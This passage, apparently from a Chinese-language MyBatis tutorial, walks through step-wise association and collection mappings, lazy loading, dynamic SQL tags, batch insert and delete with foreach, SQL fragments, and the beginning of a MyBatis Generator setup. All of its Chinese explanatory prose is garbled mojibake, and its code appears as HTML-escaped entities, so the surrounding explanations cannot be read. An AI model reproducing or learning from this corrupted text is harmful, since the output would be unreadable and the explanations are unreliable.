¹æ®select=\u0026quot;com.atguigu.mybatis.mapper.DeptMapper.getEmpAndDeptByStepTwo\u0026quot; column=\u0026quot;did\u0026quot;å¯¼å…¥è¿›æ¥\næŸ¥è¯¢å‘˜å·¥ä¿¡æ¯\nselectï¼šè®¾ç½®åˆ†å¸ƒæŸ¥è¯¢çš„sqlçš„å”¯ä¸€æ ‡è¯†ï¼ˆnamespace.SQLIdæˆ–mapperæ¥å£çš„å…¨ç±»å.æ–¹æ³•åï¼‰ columnï¼šè®¾ç½®åˆ†æ­¥æŸ¥è¯¢çš„æ¡ä»¶ 1 2 3 4 5 6 7 8 9 //EmpMapperé‡Œçš„æ–¹æ³• /** * é€šè¿‡åˆ†æ­¥æŸ¥è¯¢ï¼Œå‘˜å·¥åŠæ‰€å¯¹åº”çš„éƒ¨é—¨ä¿¡æ¯ * åˆ†æ­¥æŸ¥è¯¢ç¬¬ä¸€æ­¥ï¼šæŸ¥è¯¢å‘˜å·¥ä¿¡æ¯ * @param * @return com.atguigu.mybatis.pojo.Emp * @date 2022/2/27 20:17 */ Emp getEmpAndDeptByStepOne(@Param(\u0026#34;eid\u0026#34;) Integer eid); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;resultMap id=\u0026#34;empAndDeptByStepResultMap\u0026#34; type=\u0026#34;Emp\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;eid\u0026#34; column=\u0026#34;eid\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;empName\u0026#34; column=\u0026#34;emp_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;age\u0026#34; column=\u0026#34;age\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;sex\u0026#34; column=\u0026#34;sex\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;email\u0026#34; column=\u0026#34;email\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;association property=\u0026#34;dept\u0026#34; select=\u0026#34;com.atguigu.mybatis.mapper.DeptMapper.getEmpAndDeptByStepTwo\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/association\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--Emp getEmpAndDeptByStepOne(@Param(\u0026#34;eid\u0026#34;) Integer eid);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpAndDeptByStepOne\u0026#34; resultMap=\u0026#34;empAndDeptByStepResultMap\u0026#34;\u0026gt; select * from t_emp where eid = #{eid} \u0026lt;/select\u0026gt; æŸ¥è¯¢éƒ¨é—¨ä¿¡æ¯\n1 2 3 4 5 6 7 8 9 //DeptMapperé‡Œçš„æ–¹æ³• /** * é€šè¿‡åˆ†æ­¥æŸ¥è¯¢ï¼Œå‘˜å·¥åŠæ‰€å¯¹åº”çš„éƒ¨é—¨ä¿¡æ¯ * åˆ†æ­¥æŸ¥è¯¢ç¬¬äºŒæ­¥ï¼šé€šè¿‡didæŸ¥è¯¢å‘˜å·¥å¯¹åº”çš„éƒ¨é—¨ä¿¡æ¯ * @param * @return com.atguigu.mybatis.pojo.Emp * @date 2022/2/27 20:23 */ Dept getEmpAndDeptByStepTwo(@Param(\u0026#34;did\u0026#34;) Integer did); 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;!--æ­¤å¤„çš„resultMapä»…æ˜¯å¤„ç†å­—æ®µå’Œå±æ€§çš„æ˜ å°„å…³ç³»--\u0026gt; \u0026lt;resultMap id=\u0026#34;EmpAndDeptByStepTwoResultMap\u0026#34; type=\u0026#34;Dept\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;did\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;deptName\u0026#34; column=\u0026#34;dept_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--Dept getEmpAndDeptByStepTwo(@Param(\u0026#34;did\u0026#34;) Integer did);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpAndDeptByStepTwo\u0026#34; resultMap=\u0026#34;EmpAndDeptByStepTwoResultMap\u0026#34;\u0026gt; select * from t_dept where did = #{did} \u0026lt;/select\u0026gt; 6.3 ä¸€å¯¹å¤šæ˜ å°„å¤„ç† 1 2 3 4 5 6 public class Dept { private Integer did; private String deptName; private List\u0026lt;Emp\u0026gt; emps; //...æ„é€ å™¨ã€getã€setæ–¹æ³•ç­‰ } collection\ncollectionï¼šç”¨æ¥å¤„ç†ä¸€å¯¹å¤šçš„æ˜ å°„å…³ç³» ofTypeï¼šè¡¨ç¤ºè¯¥å±æ€§å¯¹é¥®çš„é›†åˆä¸­å­˜å‚¨çš„æ•°æ®çš„ç±»å‹ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;resultMap id=\u0026#34;DeptAndEmpResultMap\u0026#34; type=\u0026#34;Dept\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;did\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;deptName\u0026#34; column=\u0026#34;dept_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;collection property=\u0026#34;emps\u0026#34; ofType=\u0026#34;Emp\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;eid\u0026#34; column=\u0026#34;eid\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;empName\u0026#34; column=\u0026#34;emp_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;age\u0026#34; column=\u0026#34;age\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;sex\u0026#34; column=\u0026#34;sex\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;email\u0026#34; column=\u0026#34;email\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;/collection\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--Dept getDeptAndEmp(@Param(\u0026#34;did\u0026#34;) Integer did);--\u0026gt; \u0026lt;select id=\u0026#34;getDeptAndEmp\u0026#34; resultMap=\u0026#34;DeptAndEmpResultMap\u0026#34;\u0026gt; select * from t_dept left join t_emp on t_dept.did = t_emp.did where t_dept.did = #{did} \u0026lt;/select\u0026gt; åˆ†æ­¥æŸ¥è¯¢\næŸ¥è¯¢éƒ¨é—¨ä¿¡æ¯\n1 2 3 4 5 6 7 8 /** * é€šè¿‡åˆ†æ­¥æŸ¥è¯¢ï¼ŒæŸ¥è¯¢éƒ¨é—¨åŠå¯¹åº”çš„æ‰€æœ‰å‘˜å·¥ä¿¡æ¯ * åˆ†æ­¥æŸ¥è¯¢ç¬¬ä¸€æ­¥ï¼šæŸ¥è¯¢éƒ¨é—¨ä¿¡æ¯ * @param did * @return com.atguigu.mybatis.pojo.Dept * @date 2022/2/27 22:04 */ Dept getDeptAndEmpByStepOne(@Param(\u0026#34;did\u0026#34;) Integer did); 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;resultMap id=\u0026#34;DeptAndEmpByStepOneResultMap\u0026#34; type=\u0026#34;Dept\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;did\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;deptName\u0026#34; column=\u0026#34;dept_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;collection property=\u0026#34;emps\u0026#34; select=\u0026#34;com.atguigu.mybatis.mapper.EmpMapper.getDeptAndEmpByStepTwo\u0026#34; column=\u0026#34;did\u0026#34;\u0026gt;\u0026lt;/collection\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--Dept getDeptAndEmpByStepOne(@Param(\u0026#34;did\u0026#34;) Integer did);--\u0026gt; \u0026lt;select id=\u0026#34;getDeptAndEmpByStepOne\u0026#34; resultMap=\u0026#34;DeptAndEmpByStepOneResultMap\u0026#34;\u0026gt; select * from t_dept where did = #{did} \u0026lt;/select\u0026gt; æ ¹æ®éƒ¨é—¨idæŸ¥è¯¢éƒ¨é—¨ä¸­çš„æ‰€æœ‰å‘˜å·¥\n1 2 3 4 5 6 7 8 /** * é€šè¿‡åˆ†æ­¥æŸ¥è¯¢ï¼ŒæŸ¥è¯¢éƒ¨é—¨åŠå¯¹åº”çš„æ‰€æœ‰å‘˜å·¥ä¿¡æ¯ * åˆ†æ­¥æŸ¥è¯¢ç¬¬äºŒæ­¥ï¼šæ ¹æ®éƒ¨é—¨idæŸ¥è¯¢éƒ¨é—¨ä¸­çš„æ‰€æœ‰å‘˜å·¥ * @param did * @return java.util.List\u0026lt;com.atguigu.mybatis.pojo.Emp\u0026gt; * @date 2022/2/27 22:10 */ List\u0026lt;Emp\u0026gt; getDeptAndEmpByStepTwo(@Param(\u0026#34;did\u0026#34;) Integer did); 1 2 3 4 \u0026lt;!--List\u0026lt;Emp\u0026gt; getDeptAndEmpByStepTwo(@Param(\u0026#34;did\u0026#34;) Integer did);--\u0026gt; \u0026lt;select id=\u0026#34;getDeptAndEmpByStepTwo\u0026#34; resultType=\u0026#34;Emp\u0026#34;\u0026gt; select * from t_emp where did = #{did} \u0026lt;/select\u0026gt; 7 å»¶è¿ŸåŠ è½½ åœ¨mybatis-config.xmlé‡Œé¢é…ç½®å»¶è¿ŸåŠ è½½\nlazyLoadingEnabledï¼šå»¶è¿ŸåŠ è½½çš„å…¨å±€å¼€å…³ã€‚å½“å¼€å¯æ—¶ï¼Œæ‰€æœ‰å…³è”å¯¹è±¡éƒ½ä¼šå»¶è¿ŸåŠ è½½ aggressiveLazyLoadingï¼šå½“å¼€å¯æ—¶ï¼Œä»»ä½•æ–¹æ³•çš„è°ƒç”¨éƒ½ä¼šåŠ è½½è¯¥å¯¹è±¡çš„æ‰€æœ‰å±æ€§ã€‚ å¦åˆ™ï¼Œæ¯ä¸ªå±æ€§ä¼šæŒ‰éœ€åŠ è½½ 1 2 3 4 \u0026lt;settings\u0026gt; \u0026lt;!--å¼€å¯å»¶è¿ŸåŠ è½½--\u0026gt; \u0026lt;setting name=\u0026#34;lazyLoadingEnabled\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;/settings\u0026gt; å¼€å¯å»¶è¿ŸåŠ è½½åï¼ŒæŸ¥è¯¢ç›¸å…³å†…å®¹æ˜¯ï¼Œåªæœ‰éœ€è¦ç”¨åˆ°çš„æ—¶å€™ï¼ŒæœåŠ¡æ‰å»è°ƒç”¨ç›¸åº”çš„ç¨‹åºã€‚\n8 åŠ¨æ€sql 8.1 if ifæ ‡ç­¾å¯é€šè¿‡testå±æ€§ï¼ˆå³ä¼ é€’è¿‡æ¥çš„æ•°æ®ï¼‰çš„è¡¨è¾¾å¼è¿›è¡Œåˆ¤æ–­ï¼Œè‹¥è¡¨è¾¾å¼çš„ç»“æœä¸ºtrueï¼Œåˆ™æ ‡ç­¾ä¸­çš„å†…å®¹ä¼šæ‰§è¡Œï¼›åä¹‹æ ‡ç­¾ä¸­çš„å†…å®¹ä¸ä¼šæ‰§è¡Œ åœ¨whereåé¢æ·»åŠ ä¸€ä¸ªæ’æˆç«‹æ¡ä»¶1=1 è¿™ä¸ªæ’æˆç«‹æ¡ä»¶å¹¶ä¸ä¼šå½±å“æŸ¥è¯¢çš„ç»“æœ è¿™ä¸ª1=1å¯ä»¥ç”¨æ¥æ‹¼æ¥andè¯­å¥ï¼Œä¾‹å¦‚ï¼šå½“empNameä¸ºnullæ—¶ å¦‚æœä¸åŠ ä¸Šæ’æˆç«‹æ¡ä»¶ï¼Œåˆ™SQLè¯­å¥ä¸ºselect * from t_emp where and age = ? and sex = ? and email = ?ï¼Œæ­¤æ—¶whereä¼šä¸andè¿ç”¨ï¼ŒSQLè¯­å¥ä¼šæŠ¥é”™ å¦‚æœåŠ ä¸Šä¸€ä¸ªæ’æˆç«‹æ¡ä»¶ï¼Œåˆ™SQLè¯­å¥ä¸ºselect * from t_emp where 1= 1 and age = ? and sex = ? and email = ?ï¼Œæ­¤æ—¶ä¸æŠ¥é”™ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;!--List\u0026lt;Emp\u0026gt; getEmpByCondition(Emp emp);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpByCondition\u0026#34; resultType=\u0026#34;Emp\u0026#34;\u0026gt; select * from t_emp where 1=1 \u0026lt;if test=\u0026#34;empName != null and empName !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and emp_name = #{empName} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;age != null and age !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and age = #{age} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;sex != null and sex !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and sex = #{sex} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;email != null and email !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and email = #{email} \u0026lt;/if\u0026gt; \u0026lt;/select\u0026gt; 8.2 where whereå’Œifä¸€èˆ¬ç»“åˆä½¿ç”¨ï¼š\nè§£å†³å‰é¢å¸¦æœ‰and æˆ–è€… or\nè‹¥whereæ ‡ç­¾ä¸­çš„ifæ¡ä»¶éƒ½ä¸æ»¡è¶³ï¼Œåˆ™whereæ ‡ç­¾æ²¡æœ‰ä»»ä½•åŠŸèƒ½ï¼Œå³ä¸ä¼šæ·»åŠ whereå…³é”®å­—\nè‹¥whereæ ‡ç­¾ä¸­çš„ifæ¡ä»¶æ»¡è¶³ï¼Œåˆ™whereæ ‡ç­¾ä¼šè‡ªåŠ¨æ·»åŠ whereå…³é”®å­—ï¼Œå¹¶å°†æ¡ä»¶æœ€å‰æ–¹å¤šä½™çš„and/orå»æ‰ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;!--List\u0026lt;Emp\u0026gt; getEmpByCondition(Emp emp);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpByCondition\u0026#34; resultType=\u0026#34;Emp\u0026#34;\u0026gt; select * from t_emp \u0026lt;where\u0026gt; \u0026lt;if test=\u0026#34;empName != null and empName !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; emp_name = #{empName} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;age != null and age !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and age = #{age} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;sex != null and sex !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and sex = #{sex} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;email != null and email !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; and email = #{email} \u0026lt;/if\u0026gt; \u0026lt;/where\u0026gt; \u0026lt;/select\u0026gt; æ³¨æ„ï¼šwhereæ ‡ç­¾ä¸èƒ½å»æ‰æ¡ä»¶åå¤šä½™çš„and/or\n1 2 3 4 5 6 7 \u0026lt;!--è¿™ç§ç”¨æ³•æ˜¯é”™è¯¯çš„ï¼Œåªèƒ½å»æ‰æ¡ä»¶å‰é¢çš„and/orï¼Œæ¡ä»¶åé¢çš„ä¸è¡Œ--\u0026gt; \u0026lt;if test=\u0026#34;empName != null and empName !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; emp_name = #{empName} and \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;age != null and age !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; age = #{age} \u0026lt;/if\u0026gt; 8.3 trim trimç”¨äºå»æ‰æˆ–æ·»åŠ æ ‡ç­¾ä¸­çš„å†…å®¹\nè§£å†³åé¢å¸¦æœ‰and æˆ–è€… or\nå¸¸ç”¨å±æ€§\nprefixï¼šåœ¨trimæ ‡ç­¾ä¸­çš„å†…å®¹çš„å‰é¢æ·»åŠ æŸäº›å†…å®¹\nsuffixï¼šåœ¨trimæ ‡ç­¾ä¸­çš„å†…å®¹çš„åé¢æ·»åŠ æŸäº›å†…å®¹ prefixOverridesï¼šåœ¨trimæ ‡ç­¾ä¸­çš„å†…å®¹çš„å‰é¢å»æ‰æŸäº›å†…å®¹ suffixOverridesï¼šåœ¨trimæ ‡ç­¾ä¸­çš„å†…å®¹çš„åé¢å»æ‰æŸäº›å†…å®¹ è‹¥trimä¸­çš„æ ‡ç­¾éƒ½ä¸æ»¡è¶³æ¡ä»¶ï¼Œåˆ™trimæ ‡ç­¾æ²¡æœ‰ä»»ä½•æ•ˆæœï¼Œä¹Ÿå°±æ˜¯åªå‰©ä¸‹select * from t_emp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;!--List\u0026lt;Emp\u0026gt; getEmpByCondition(Emp emp);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpByCondition\u0026#34; resultType=\u0026#34;Emp\u0026#34;\u0026gt; select * from t_emp \u0026lt;trim prefix=\u0026#34;where\u0026#34; suffixOverrides=\u0026#34;and|or\u0026#34;\u0026gt; \u0026lt;if test=\u0026#34;empName != null and empName !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; emp_name = #{empName} and \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;age != null and age !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; age = #{age} and \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;sex != null and sex !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; sex = #{sex} or \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;email != null and email !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; email = #{email} \u0026lt;/if\u0026gt; \u0026lt;/trim\u0026gt; \u0026lt;/select\u0026gt; 8.4 chooseã€whenã€otherwise chooseã€whenã€otherwiseç›¸å½“äºif...else if..else\nwhenè‡³å°‘è¦æœ‰ä¸€ä¸ªï¼Œotherwiseè‡³å¤šåªæœ‰ä¸€ä¸ª\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;select id=\u0026#34;getEmpByChoose\u0026#34; resultType=\u0026#34;Emp\u0026#34;\u0026gt; select * from t_emp \u0026lt;where\u0026gt; \u0026lt;choose\u0026gt; \u0026lt;when test=\u0026#34;empName != null and empName != \u0026#39;\u0026#39;\u0026#34;\u0026gt; emp_name = #{empName} \u0026lt;/when\u0026gt; \u0026lt;when test=\u0026#34;age != null and age != \u0026#39;\u0026#39;\u0026#34;\u0026gt; age = #{age} \u0026lt;/when\u0026gt; \u0026lt;when test=\u0026#34;sex != null and sex != \u0026#39;\u0026#39;\u0026#34;\u0026gt; sex = #{sex} \u0026lt;/when\u0026gt; \u0026lt;when test=\u0026#34;email != null and email != \u0026#39;\u0026#39;\u0026#34;\u0026gt; email = #{email} \u0026lt;/when\u0026gt; \u0026lt;otherwise\u0026gt; did = 1 \u0026lt;/otherwise\u0026gt; \u0026lt;/choose\u0026gt; \u0026lt;/where\u0026gt; \u0026lt;/select\u0026gt; 8.5 foreach å±æ€§ï¼š\ncollectionï¼šè®¾ç½®è¦å¾ªç¯çš„æ•°ç»„æˆ–é›†åˆ\nitemï¼šè¡¨ç¤ºé›†åˆæˆ–æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªæ•°æ® separatorï¼šè®¾ç½®å¾ªç¯ä½“ä¹‹é—´çš„åˆ†éš”ç¬¦ï¼Œåˆ†éš”ç¬¦å‰åé»˜è®¤æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œå¦‚, openï¼šè®¾ç½®foreachæ ‡ç­¾ä¸­çš„å†…å®¹çš„å¼€å§‹ç¬¦ closeï¼šè®¾ç½®foreachæ ‡ç­¾ä¸­çš„å†…å®¹çš„ç»“æŸç¬¦ æ‰¹é‡åˆ é™¤\n1 2 3 4 5 6 7 8 9 \u0026lt;!--int deleteMoreByArray(Integer[] eids); int result = mapper.deleteMoreByArray(new Integer[]{6, 7, 8, 9}); --\u0026gt; \u0026lt;delete id=\u0026#34;deleteMoreByArray\u0026#34;\u0026gt; delete from t_emp where eid in \u0026lt;foreach collection=\u0026#34;eids\u0026#34; item=\u0026#34;eid\u0026#34; separator=\u0026#34;,\u0026#34; open=\u0026#34;(\u0026#34; close=\u0026#34;)\u0026#34;\u0026gt; #{eid} \u0026lt;/foreach\u0026gt; \u0026lt;/delete\u0026gt; æ‰¹é‡æ·»åŠ \n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!--int insertMoreByList(@Param(\u0026#34;emps\u0026#34;) List\u0026lt;Emp\u0026gt; emps); List\u0026lt;Emp\u0026gt; emps = Arrays.asList(emp1, emp2, emp3); int result = mapper.insertMoreByList(emps); --\u0026gt; \u0026lt;insert id=\u0026#34;insertMoreByList\u0026#34;\u0026gt; insert into t_emp values \u0026lt;foreach collection=\u0026#34;emps\u0026#34; item=\u0026#34;emp\u0026#34; separator=\u0026#34;,\u0026#34;\u0026gt; (null,#{emp.empName},#{emp.age},#{emp.sex},#{emp.email},null) \u0026lt;/foreach\u0026gt; \u0026lt;/insert\u0026gt; 8.6 sql ç‰‡æ®µ sqlç‰‡æ®µï¼Œå¯ä»¥è®°å½•ä¸€æ®µå…¬å…±sqlç‰‡æ®µï¼Œåœ¨ä½¿ç”¨çš„åœ°æ–¹é€šè¿‡includeæ ‡ç­¾è¿›è¡Œå¼•å…¥ å£°æ˜sqlç‰‡æ®µï¼š\u0026lt;sql\u0026gt;æ ‡ç­¾ 1 \u0026lt;sql id=\u0026#34;empColumns\u0026#34;\u0026gt;eid,emp_name,age,sex,email\u0026lt;/sql\u0026gt; å¼•ç”¨sqlç‰‡æ®µï¼š\u0026lt;include\u0026gt;æ ‡ç­¾ 1 2 3 4 \u0026lt;!--List\u0026lt;Emp\u0026gt; getEmpByCondition(Emp emp);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpByCondition\u0026#34; resultType=\u0026#34;Emp\u0026#34;\u0026gt; select \u0026lt;include refid=\u0026#34;empColumns\u0026#34;\u0026gt;\u0026lt;/include\u0026gt; from t_emp \u0026lt;/select\u0026gt; 9 MyBatisçš„é€†å‘å·¥ç¨‹ æ­£å‘å·¥ç¨‹ï¼šå…ˆåˆ›å»ºJavaå®ä½“ç±»ï¼Œç”±æ¡†æ¶è´Ÿè´£æ ¹æ®å®ä½“ç±»ç”Ÿæˆæ•°æ®åº“è¡¨ã€‚Hibernateæ˜¯æ”¯æŒæ­£å‘å·¥ç¨‹çš„\né€†å‘å·¥ç¨‹ï¼šå…ˆåˆ›å»ºæ•°æ®åº“è¡¨ï¼Œç”±æ¡†æ¶è´Ÿè´£æ ¹æ®æ•°æ®åº“è¡¨ï¼Œåå‘ç”Ÿæˆå¦‚ä¸‹èµ„æºï¼š\nJavaå®ä½“ç±»\nMapperæ¥å£ Mapperæ˜ å°„æ–‡ä»¶ æ·»åŠ ä¾èµ–\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 \u0026lt;dependencies\u0026gt; \u0026lt;!-- MyBatisæ ¸å¿ƒä¾èµ–åŒ… --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.9\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- junitæµ‹è¯• --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;junit\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;junit\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.13.2\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- MySQLé©±åŠ¨ --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.0.27\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- log4jæ—¥å¿— --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.17\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;!-- æ§åˆ¶Mavenåœ¨æ„å»ºè¿‡ç¨‹ä¸­ç›¸å…³é…ç½® --\u0026gt; \u0026lt;build\u0026gt; \u0026lt;!-- æ„å»ºè¿‡ç¨‹ä¸­ç”¨åˆ°çš„æ’ä»¶ --\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;!-- å…·ä½“æ’ä»¶ï¼Œé€†å‘å·¥ç¨‹çš„æ“ä½œæ˜¯ä»¥æ„å»ºè¿‡ç¨‹ä¸­æ’ä»¶å½¢å¼å‡ºç°çš„ --\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis.generator\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis-generator-maven-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.3.0\u0026lt;/version\u0026gt; \u0026lt;!-- æ’ä»¶çš„ä¾èµ– --\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;!-- é€†å‘å·¥ç¨‹çš„æ ¸å¿ƒä¾èµ– --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis.generator\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis-generator-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.3.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- æ•°æ®åº“è¿æ¥æ±  --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.mchange\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;c3p0\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;0.9.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- MySQLé©±åŠ¨ --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.0.27\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;/build\u0026gt; åˆ›å»ºé€†å‘å·¥ç¨‹çš„é…ç½®æ–‡ä»¶\næ–‡ä»¶åå¿…é¡»æ˜¯ï¼šgeneratorConfig.xml è¿™é‡Œæ˜¯macä¸‹çš„è·¯å¾„ï¼Œwindowséœ€è¦é¢å¤–ä¿®æ”¹ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE generatorConfiguration PUBLIC \u0026#34;-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN\u0026#34; \u0026#34;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd\u0026#34;\u0026gt; \u0026lt;generatorConfiguration\u0026gt; \u0026lt;!-- targetRuntime: æ‰§è¡Œç”Ÿæˆçš„é€†å‘å·¥ç¨‹çš„ç‰ˆæœ¬ MyBatis3Simple: ç”ŸæˆåŸºæœ¬çš„CRUDï¼ˆæ¸…æ–°ç®€æ´ç‰ˆï¼‰ MyBatis3: ç”Ÿæˆå¸¦æ¡ä»¶çš„CRUDï¼ˆå¥¢åå°Šäº«ç‰ˆï¼‰ --\u0026gt; \u0026lt;context id=\u0026#34;DB2Tables\u0026#34; targetRuntime=\u0026#34;MyBatis3\u0026#34;\u0026gt; \u0026lt;!-- æ•°æ®åº“çš„è¿æ¥ä¿¡æ¯ --\u0026gt; \u0026lt;jdbcConnection driverClass=\u0026#34;com.mysql.cj.jdbc.Driver\u0026#34; connectionURL=\u0026#34;jdbc:mysql://localhost:3306/mybatis?characterEncoding=utf8\u0026amp;amp;useSSL=false\u0026amp;amp;serverTimezone=UTC\u0026amp;amp;rewriteBatchedStatements=true\u0026#34; userId=\u0026#34;root\u0026#34; password=\u0026#34;root\u0026#34;\u0026gt; \u0026lt;/jdbcConnection\u0026gt; \u0026lt;!-- javaBeançš„ç”Ÿæˆç­–ç•¥--\u0026gt; \u0026lt;javaModelGenerator targetPackage=\u0026#34;com.reus.mybatis.pojo\u0026#34; targetProject=\u0026#34;./src/main/java\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;enableSubPackages\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;property name=\u0026#34;trimStrings\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/javaModelGenerator\u0026gt; \u0026lt;!-- SQLæ˜ 